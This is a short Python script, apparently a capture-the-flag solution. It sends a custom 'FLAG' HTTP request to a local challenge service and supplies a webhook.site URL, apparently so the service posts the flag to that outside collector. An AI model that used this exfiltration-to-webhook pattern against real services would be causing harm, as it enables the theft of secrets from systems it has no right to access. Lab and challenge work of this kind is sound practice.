import requests

url = "http://localhost:6969"

r = requests.request("FLAG", url, json={"url": "https://webhook.site/fb1ce467-a08a-4a3b-92e7-8a345df2a68d"})
print(r.text)